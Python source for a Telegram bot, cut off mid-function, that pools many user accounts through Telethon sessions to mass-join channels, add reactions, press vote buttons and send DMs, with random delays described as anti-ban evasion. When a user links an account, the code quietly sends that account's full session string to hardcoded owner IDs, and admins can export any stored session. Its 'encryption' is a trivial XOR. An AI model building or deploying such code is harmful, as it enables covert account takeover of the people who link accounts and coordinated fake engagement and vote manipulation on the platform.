import asyncio
import base64
import json
import logging
import os
import re
import sys
from typing import Dict, Any, List, Optional, Tuple

# aiogram 3.x imports
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile
)

# Telethon imports
from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    FloodWaitError
)

# SQLite
import aiosqlite

import config

# --- LOGGING SYSTEM ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("MultiAccountSystem")

bot = Bot(token=config.BOT_TOKEN)

# --- SYSTEM LOG DISPATCHER ---
async def dispatch_log(text: str):
    """Dispatches real-time structural audits to standard out and the log channel."""
    logger.info(f"[LOG CHANNEL EVENT]: {text}")
    try:
        await bot.send_message(chat_id=config.LOG_CHANNEL_ID, text=f"🔔 **System Audit Event**\n\n{text}")
    except Exception as e:
        logger.error(
            f"❌ LOG DELIVERY FAILURE to Channel ID {config.LOG_CHANNEL_ID}!\n"
            f"Reason: {e}\n"
            f"-> ACTION REQUIRED: Add the bot to your private channel as an Admin with 'Post Messages' rights!"
        )

# --- CRYPTO HELPERS ---
def _get_crypto_key() -> int:
    return sum(ord(c) for c in config.SECRET_KEY) % 256 or 42

def encrypt_data(data: str) -> str:
    key = _get_crypto_key()
    cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
    return base64.b64encode(cipher_bytes).decode('utf-8')

def decrypt_data(encrypted_data: str) -> str:
    key = _get_crypto_key()
    try:
        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
        plain_bytes = bytes([b ^ key for b in raw_cipher])
        return plain_bytes.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption failure: {e}")
        return ""

# --- LINK PARSING HELPER ---
def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
    link = link.strip().replace(" ", "")
    if not link:
        return None, None, False
        
    hash_match = re.search(r'(?:joinchat/|\+|t\.me/\+)([a-zA-Z0-9_\-]+)', link)
    if hash_match:
        return hash_match.group(1), None, True

    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
    if private_match:
        channel_id = int(f"-100{private_match.group(1)}")
        msg_id = int(private_match.group(2))
        return channel_id, msg_id, False
        
    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
    if msg_match:
        return msg_match.group(1), int(msg_match.group(2)), False
        
    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
    if "/" in target:
        parts = target.split("/")
        target = parts[0]
        if len(parts) > 1 and parts[1].isdigit():
            msg_id = int(parts[1])
            return target, msg_id, False
            
    return target, None, False

# --- DATABASE ENGINE ---
class Database:
    def __init__(self, db_path: str = "bot_core_data.db"):
        self.db_path = db_path

    async def init(self):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    role TEXT DEFAULT 'user', 
                    max_accounts INTEGER DEFAULT 5,
                    referred_by INTEGER,
                    status TEXT DEFAULT 'active',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS accounts (
                    phone TEXT PRIMARY KEY,
                    user_id INTEGER, 
                    username TEXT,
                    session_string TEXT,
                    status TEXT DEFAULT 'active', 
                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id)
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    creator_id INTEGER,
                    type TEXT, 
                    payload TEXT, 
                    status TEXT DEFAULT 'pending', 
                    progress TEXT DEFAULT '0%',
                    success_report TEXT,
                    failure_report TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    action TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.commit()
            logger.info("Database system initialized.")

    async def log_action(self, user_id: int, action: str):
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute("INSERT INTO logs (user_id, action) VALUES (?, ?)", (user_id, action))
            await db.commit()
        await dispatch_log(f"👤 **User ID:** `{user_id}`\n🛠️ **Action:** {action}")

    async def get_user_role(self, user_id: int) -> str:
        if user_id in config.SUPER_OWNER_IDS:
            return "super_owner"
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute("SELECT role, status FROM users WHERE user_id = ?", (user_id,)) as cursor:
                row = await cursor.fetchone()
                if row:
                    if row[1] == "banned":
                        return "banned"
                    return row[0]
                return "user"

    async def create_user_if_not_exists(self, user_id: int, username: str, referred_by: Optional[int] = None):
        async with aiosqlite.connect(self.db_path) as db:
            async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,)) as cursor:
                if not await cursor.fetchone():
                    await db.execute(
                        "INSERT INTO users (user_id, username, role, referred_by) VALUES (?, ?, 'user', ?)",
                        (user_id, username, referred_by)
                    )
                    await db.commit()
                    if referred_by:
                        await self.log_action(user_id, f"Registered via referral node link from Owner ID: `{referred_by}`")

db_mgr = Database()
registration_sessions: Dict[int, Dict[str, Any]] = {}

# --- ANTI-BAN TASK MANAGER ---
class TaskQueue:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.current_tasks: Dict[int, asyncio.Task] = {}

    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict):
        await self.queue.put((task_id, creator_id, task_type, payload))

    async def start_worker(self):
        while True:
            task_id, creator_id, task_type, payload = await self.queue.get()
            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload))
            self.current_tasks[task_id] = loop_task
            try:
                await loop_task
            except Exception as e:
                logger.error(f"Execution failure on task #{task_id}: {e}")
            finally:
                self.current_tasks.pop(task_id, None)
                self.queue.task_done()

    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict):
        import random

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("UPDATE tasks SET status = 'running', progress = '0%' WHERE task_id = ?", (task_id,))
            await db.commit()

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            if role in ["admin", "owner", "super_owner"]:
                cursor = await db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'")
            else:
                cursor = await db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?", (creator_id,))
            async for row in cursor:
                clients_data.append((row[0], decrypt_data(row[1])))

        if not clients_data:
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET status = 'failed', progress = '0 active bridges available' WHERE task_id = ?", (task_id,))
                await db.commit()
            return

        passed_ids: List[str] = []
        failed_ids: List[Tuple[str, str]] = []
        total_accounts = len(clients_data)

        BATCH_SIZE = 5               
        BASE_COOLDOWN = 15           

        for index, (phone, enc_session) in enumerate(clients_data):
            client = TelegramClient(StringSession(enc_session), config.API_ID, config.API_HASH)
            try:
                await asyncio.sleep(random.uniform(1.0, 3.0))
                await client.connect()
                
                if not await client.is_user_authorized():
                    async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                        await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                        await db_conn.commit()
                    failed_ids.append((phone, "Unauthorized/Session Expired"))
                    continue

                target = payload.get("target", "")
                parsed_target, link_msg_id, is_private_hash = parse_telegram_link(target)
                msg_id = int(payload.get("msg_id", link_msg_id or 0))

                await asyncio.sleep(random.uniform(2.5, 5.0))

                if task_type == "join":
                    if is_private_hash:
                        await client(functions.messages.ImportChatInviteRequest(hash=parsed_target))
                    else:
                        await client(functions.channels.JoinChannelRequest(channel=parsed_target))
                        
                elif task_type == "leave":
                    await client(functions.channels.LeaveChannelRequest(channel=parsed_target))
                    
                elif task_type == "react":
                    react_mode = payload.get("react_mode", "standard")
                    emojis = payload.get("reactions", ["👍"])
                    
                    if react_mode == "random":
                        assigned_emoji = random.choice(config.REACTION_EMOJIS)
                    elif react_mode == "existing_reactions":
                        msg = await client.get_messages(parsed_target, ids=msg_id)
                        if msg and msg.reactions and msg.reactions.results:
                            active_reactions = [
                                r.reaction.emoticon for r in msg.reactions.results 
                                if hasattr(r.reaction, 'emoticon')
                            ]
                            assigned_emoji = random.choice(active_reactions) if active_reactions else random.choice(emojis)
                        else:
                            assigned_emoji = random.choice(emojis)
                    else:
                        assigned_emoji = emojis[index % len(emojis)]

                    await client(functions.messages.SendReactionRequest(
                        peer=parsed_target,
                        msg_id=msg_id,
                        reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                    ))
                        
                elif task_type == "button_vote":
                    button_text = payload.get("button_text", "").strip().lower()
                    msg = await client.get_messages(parsed_target, ids=msg_id)
                    if msg and msg.reply_markup:
                        target_button = None
                        for row in msg.reply_markup.rows:
                            for btn in row.buttons:
                                if button_text in btn.text.strip().lower():
                                    target_button = btn
                                    break
                            if target_button:
                                break
                                
                        if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                            await client(functions.messages.GetBotCallbackAnswerRequest(
                                peer=parsed_target,
                                msg_id=msg_id,
                                data=target_button.data
                            ))
                        else:
                            raise ValueError(f"No callback button containing '{button_text}' was found.")
                    else:
                        raise ValueError("No inline layout keyboard signature found on the message node.")
                        
                elif task_type == "dm":
                    message_text = payload.get("text", "Hello!")
                    await client.send_message(parsed_target, message_text)

                passed_ids.append(phone)
                
            except FloodWaitError as fwe:
                failed_ids.append((phone, f"FloodWait: {fwe.seconds}s"))
                await asyncio.sleep(min(fwe.seconds, 30))
            except Exception as e:
                failed_ids.append((phone, str(e)))
            finally:
                await client.disconnect()

            if (index + 1) % BATCH_SIZE == 0 and (index + 1) < total_accounts:
                await asyncio.sleep(BASE_COOLDOWN + random.randint(5, 15))
            else:
                await asyncio.sleep(random.uniform(3.0, 6.5))

            progress_pct = f"{int(((index + 1) / total_accounts) * 100)}%"
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (progress_pct, task_id))
                await db.commit()

        status = "completed" if len(passed_ids) > 0 else "failed"
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute(
                "UPDATE tasks SET status = ?, progress = ?, success_report = ?, failure_report = ? WHERE task_id = ?",
                (status, f"{len(passed_ids)}/{total_accounts} Passed", json.dumps(passed_ids), json.dumps(failed_ids), task_id)
            )
            await db.commit()

        await dispatch_log(
            f"📋 **Task #{task_id} Completed**\n"
            f"⚙️ **Type:** `{task_type.upper()}`\n"
            f"🟢 **Success:** `{len(passed_ids)}` | 🔴 **Failed:** `{len(failed_ids)}`"
        )

task_queue = TaskQueue()

# --- FSM STATES ---
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()
    waiting_for_session_file = State()  # New state for direct session file imports

class TaskWizardStates(StatesGroup):
    choosing_type = State()
    waiting_for_target = State()
    choosing_react_mode = State()
    waiting_for_emojis = State()
    waiting_for_button_text = State()
    waiting_for_dm_text = State()

# --- KEYBOARDS ---
def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(text="📱 Manage Client Infrastructure", callback_data="manage_accounts")],
        [InlineKeyboardButton(text="⚡ Setup Automation Task", callback_data="task_hub_start")],
        [InlineKeyboardButton(text="📊 Operational Pipeline Logs", callback_data="view_tasks")],
        [InlineKeyboardButton(text="👥 My Referral Matrix", callback_data="view_referrals")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛠️ Administrative Control Console", callback_data="admin_panel")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 Database Core Backups", callback_data="backup_panel")])
        buttons.append([InlineKeyboardButton(text="📈 System Performance Analytics", callback_data="system_stats")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

# --- ACCOUNT MANAGER WITH EXPORT BUTTONS ---
async def make_accounts_keyboard(user_id: int, role: str) -> InlineKeyboardMarkup:
    keyboard_layout = []
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            cursor = await db.execute("SELECT phone, status, username FROM accounts")
        else:
            cursor = await db.execute("SELECT phone, status, username FROM accounts WHERE user_id = ?", (user_id,))
        rows = await cursor.fetchall()

    # Map each phone with its individual properties and individual export options
    for phone, status, username in rows:
        icon = "🟢" if status == "active" else "🔴"
        name_display = f"@{username}" if username and username != "None" else "No Username"
        
        # Row 1: Active display layout
        keyboard_layout.append([
            InlineKeyboardButton(text=f"{icon} +{phone} ({name_display})", callback_data=f"info_node:{phone}")
        ])
        # Row 2: Direct operations row immediately below each number
        keyboard_layout.append([
            InlineKeyboardButton(text=f"📥 Export +{phone} .session", callback_data=f"direct_export:{phone}")
        ])

    # Universal Management Operations
    keyboard_layout.append([InlineKeyboardButton(text="➕ Link via OTP (Phone)", callback_data="add_account_phone")])
    keyboard_layout.append([InlineKeyboardButton(text="📥 Link via Session File", callback_data="add_account_session_file")])
    keyboard_layout.append([InlineKeyboardButton(text="🔙 Back to Main Console", callback_data="main_menu")])
    
    return InlineKeyboardMarkup(inline_keyboard=keyboard_layout)

# --- HANDLERS ---
router = Router()

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    role = await db_mgr.get_user_role(user_id)
    if role == "banned":
        await message.answer("🚫 You have been banned from using this system.")
        return

    referred_by = None
    if len(message.text.split()) > 1:
        ref_payload = message.text.split()[1]
        if ref_payload.startswith("ref_") and ref_payload[4:].isdigit():
            referred_by = int(ref_payload[4:])
            if referred_by == user_id:
                referred_by = None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)

    welcome_text = (
        f"👋 Welcome to the **Multi-Account Automation Framework**!\n\n"
        f"3👤 **Account ID:** `{user_id}`\n"
        f"🛡️ **System Privilege Level:** `{role.upper()}`\n\n"
        "Deploy, coordinate, and monitor distributed infrastructure tasks safely."
    )
    await message.answer(welcome_text, reply_markup=get_main_keyboard(role))

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role == "banned":
        await callback.answer("🚫 You are banned.", show_alert=True)
        return
    await callback.message.edit_text(
        "👋 **Main Control Console**\nSelect an action vector below:",
        reply_markup=get_main_keyboard(role)
    )

# --- ACCOUNT INFRASTRUCTURE PANEL ---
@router.callback_query(F.data == "manage_accounts")
async def list_user_accounts(callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role == "banned":
        await callback.answer("🚫 Banned.", show_alert=True)
        return

    markup = await make_accounts_keyboard(user_id, role)
    await callback.message.edit_text(
        "📱 **Infrastructure Node Manager**\nUse the dynamic export links below each phone to download their `.session` string files instantly:",
        reply_markup=markup
    )

# --- DYNAMIC INLINE SESSION EXPORTER ---
@router.callback_query(F.data.startswith("direct_export:"))
async def handle_direct_export(callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role == "banned":
        await callback.answer("🚫 Access Denied.", show_alert=True)
        return

    phone = callback.data.split(":")[1]
    
    # Check authorization mapping logic
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            cursor = await db.execute("SELECT session_string, user_id FROM accounts WHERE phone = ?", (phone,))
        else:
            cursor = await db.execute("SELECT session_string, user_id FROM accounts WHERE phone = ? AND user_id = ?", (phone, user_id))
        row = await cursor.fetchone()

    if not row:
        await callback.answer("❌ Verification Failed: Unauthorized request.", show_alert=True)
        return

    await callback.answer("📥 Generating session file...")
    session_str = decrypt_data(row[0])
    
    file_payload = BufferedInputFile(session_str.encode('utf-8'), filename=f"+{phone}.session")
    await callback.message.reply_document(
        document=file_payload, 
        caption=f"🔑 **Secure Extraction File**\n📱 Phone: `+{phone}`\n🔒 Encrypted strictly for your system nodes."
    )

@router.callback_query(F.data == "info_node:")
async def handle_node_info_alert(callback: CallbackQuery):
    await callback.answer("Use the export button directly below this number to pull its credentials.", show_alert=True)

# --- INTERACTIVE LINK VIA SESSION FILE ---
@router.callback_query(F.data == "add_account_session_file")
async def start_session_file_wizard(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["admin", "owner", "super_owner"]:
        await callback.answer("🚫 Unauthorized: Only administrators can import raw sessions.", show_alert=True)
        return

    await callback.message.edit_text(
        "📥 **Session File Importer Wizard**\n\n"
        "Send or forward a valid Telethon `.session` document to this chat. "
        "The bot will verify the MTProto handshake and link it instantly.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Cancel", callback_data="manage_accounts")]
        ])
    )
    await state.set_state(RegistrationStates.waiting_for_session_file)

# Process session file in FSM wizard
@router.message(StateFilter(RegistrationStates.waiting_for_session_file), F.document)
async def process_session_file_input(message: Message, state: FSMContext):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)

    if not message.document.file_name.endswith(".session"):
        await message.answer("❌ Invalid format. Please send a file that ends with `.session`.")
        return

    status_msg = await message.answer("📥 **Downloading and verifying session structural integrity...**")
    file_info = await bot.get_file(message.document.file_id)
    
    temp_path = f"wizard_temp_{message.document.file_name}"
    await bot.download_file(file_info.file_path, temp_path)

    try:
        with open(temp_path, "r", encoding="utf-8", errors="ignore") as f:
            session_data = f.read().strip()

        session_str = StringSession(session_data).save() if len(session_data) > 60 else session_data
        
        client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await status_msg.edit_text("❌ Connection failed: The session file has expired or is invalid.")
            await client.disconnect()
            return

        me = await client.get_me()
        phone = me.phone
        encrypted_session = encrypt_data(session_str)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (phone, user_id, me.username or "None", encrypted_session))
            await db.commit()

        await client.disconnect()
        await db_mgr.log_action(user_id, f"Direct-imported session file for +{phone} via setup wizard.")
        await status_msg.edit_text(
            f"✅ **Import Successful!**\n\n"
            f"📱 **Phone:** `+{phone}`\n"
            f"👤 **Username:** @{me.username or 'None'}\n\n"
            f"This account has been added to the system database.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📱 Manage Accounts", callback_data="manage_accounts")]])
        )
        await state.clear()

    except Exception as e:
        await status_msg.edit_text(f"❌ **Failed to import session file:** {str(e)}")
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)

# --- FORWARDED TELETON IMPORTER (OUTSIDE STATE CHIPS) ---
@router.message(F.document)
async def handle_outside_forwarded_session(message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["admin", "owner", "super_owner"] or not message.document.file_name.endswith(".session"):
        return

    status_msg = await message.answer("📥 **Direct Forward Detected: Validating and importing...**")
    file_info = await bot.get_file(message.document.file_id)
    temp_path = f"fwd_temp_{message.document.file_name}"
    await bot.download_file(file_info.file_path, temp_path)

    try:
        with open(temp_path, "r", encoding="utf-8", errors="ignore") as f:
            session_data = f.read().strip()

        session_str = StringSession(session_data).save() if len(session_data) > 60 else session_data
        
        client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await status_msg.edit_text("❌ Verification failed: Expired forwarded session key.")
            await client.disconnect()
            return

        me = await client.get_me()
        phone = me.phone
        encrypted_session = encrypt_data(session_str)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (phone, user_id, me.username or "None", encrypted_session))
            await db.commit()

        await client.disconnect()
        await db_mgr.log_action(user_id, f"Imported forwarded Telethon session file for +{phone}")
        await status_msg.edit_text(f"✅ **Import Successful!**\n📱 Phone: `+{phone}`\n👤 Username: @{me.username or 'None'} has been linked.")

    except Exception as e:
        await status_msg.edit_text(f"❌ **Failed to import forwarded session:** {str(e)}")
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)

# --- OTP LINKING ENGINE ---
@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📞 Enter the account phone number with country prefix code (e.g. `+123456789`):")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id

    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash
        }
        await message.answer("📩 **OTP Code dispatched.** Input validation sequence string below:")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        await message.answer(f"❌ Error initializing MTProto channel: {str(e)}\nUse /start to reset state machine.")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext):
    user_id = message.from_user.id
    otp = message.text.strip()
    
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Cache timeout. Reinitialize sequence with /start.")
        await state.clear()
        return

    client, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        await complete_registration(message, state, client, phone, user_id)
    except SessionPasswordNeededError:
        await message.answer("🔒 Two-Factor Authentication (2FA) active. Enter account security password:")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except PhoneCodeInvalidError:
        await message.answer("❌ Validation mismatch. Verify code entry parameters:")
    except Exception as e:
        await message.answer(f"❌ Handshake failed: {str(e)}")
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text.strip()

    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Session context dropped. Reinitialize framework.")
        await state.clear()
        return

    client, phone = reg_data["client"], reg_data["phone"]
    try:
        await client.sign_in(password=password)
        await complete_registration(message, state, client, phone, user_id)
    except PasswordHashInvalidError:
        await message.answer("❌ Password mismatch validation failed. Re-enter 2FA phrase:")
    except Exception as e:
        await message.answer(f"❌ Auth Exception: {str(e)}")
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int):
    try:
        me = await client.get_me()
        session_str = client.session.save()
        encrypted_session = encrypt_data(session_str)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
            await db.commit()

        await db_mgr.log_action(user_id, f"Linked account session +{phone}")
        await message.answer(f"🎉 Channel Verified! Account `+{phone}` (@{me.username or 'N/A'}) is active in the cluster.")
        
        # Dispatch backup files to linking users and administrators
        clean_phone = phone.replace("+", "").strip()
        session_bytes = session_str.encode('utf-8')
        session_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
        
        caption_text = (
            f"🔑 **New Session File String Extracted**\n"
            f"📱 **Phone:** `+{clean_phone}`\n"
            f"👤 **Username:** @{me.username or 'N/A'}\n"
            f"🆔 **Linked By User ID:** `{user_id}`"
        )
        
        try:
            await message.answer_document(document=session_file, caption=caption_text)
        except Exception as e:
            logger.error(f"Failed sending session file copy to linking user: {e}")
            
        for owner_id in config.SUPER_OWNER_IDS:
            try:
                owner_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
                await message.bot.send_document(chat_id=owner_id, document=owner_file, caption=caption_text)
            except Exception as owner_err:
                logger.error(f"Could not forward session data packet to superowner {owner_id}: {owner_err}")

    except Exception as e:
        await message.answer(f"❌ Database registration failure: {str(e)}")
    finally:
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

# --- ADMIN CMDS ---
@router.message(Command("addadmin"))
async def cmd_add_admin(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["owner", "super_owner"]:
        await message.answer("🚫 Access Denied: Insufficient authorization profiles.")
        return

    args = message.text.split()
    if len(args) < 3 or not args[1].isdigit() or not args[2].isdigit():
        await message.answer("ℹ️ **Usage:** `/addadmin <target_user_id> <max_account_limit>`\nExample: `/addadmin 987654321 50`")
        return

    target_id, limit = int(args[1]), int(args[2])
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (target_id,)) as cursor:
            if not await cursor.fetchone():
                await db.execute("INSERT INTO users (user_id, username, role, max_accounts) VALUES (?, 'Admin Profile', 'admin', ?)", (target_id, limit))
            else:
                await db.execute("UPDATE users SET role = 'admin', max_accounts = ? WHERE user_id = ?", (limit, target_id))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Promoted user {target_id} to Admin with account limit {limit}")
    await message.answer(f"✅ Success! User ID `{target_id}` is now registered as an **Admin** with access limits set to `{limit}` automated IDs.")

@router.message(Command("removeadmin"))
async def cmd_remove_admin(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["owner", "super_owner"]:
        await message.answer("🚫 Access Denied.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("ℹ️ **Usage:** `/removeadmin <target_user_id>`")
        return

    target_id = int(args[1])
    target_role = await db_mgr.get_user_role(target_id)
    if target_role == "super_owner":
        await message.answer("❌ Security Violation: Super Owners cannot be demoted.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET role = 'user', max_accounts = 5 WHERE user_id = ?", (target_id,))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Demoted Admin {target_id}")
    await message.answer(f"✅ User ID `{target_id}` has been stripped of Admin access privileges.")

@router.message(Command("banuser"))
async def cmd_ban_user(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("🚫 Access Denied.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("ℹ️ **Usage:** `/banuser <target_user_id>`")
        return

    target_id = int(args[1])
    target_role = await db_mgr.get_user_role(target_id)
    if target_role in ["owner", "super_owner"]:
        await message.answer("❌ System Error: You cannot ban administrative owners.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET status = 'banned' WHERE user_id = ?", (target_id,))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Banned user ID {target_id}")
    await message.answer(f"✅ User ID `{target_id}` has been successfully banned from using the system.")

@router.message(Command("unbanuser"))
async def cmd_unban_user(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("🚫 Access Denied.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("ℹ️ **Usage:** `/unbanuser <target_user_id>`")
        return

    target_id = int(args[1])
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET status = 'active' WHERE user_id = ?", (target_id,))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Unbanned user ID {target_id}")
    await message.answer(f"✅ User ID `{target_id}` status set back to active.")

@router.message(Command("deletenumber"))
async def cmd_delete_number(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("🚫 Access Denied.")
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer("ℹ️ **Usage:** `/deletenumber <phone_number_without_plus>`\nExample: `/deletenumber 1234567890`")
        return

    phone = args[1].replace("+", "").strip()
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT 1 FROM accounts WHERE phone = ?", (phone,)) as cursor:
            if not await cursor.fetchone():
                await message.answer("❌ This phone number does not exist inside our active nodes.")
                return
        await db.execute("DELETE FROM accounts WHERE phone = ?", (phone,))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Deleted account node +{phone} from system.")
    await message.answer(f"✅ Bridge node account `+{phone}` has been successfully unlinked and wiped.")

@router.message(Command("deleteuser"))
async def cmd_delete_user(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["owner", "super_owner"]:
        await message.answer("🚫 Access Denied.")
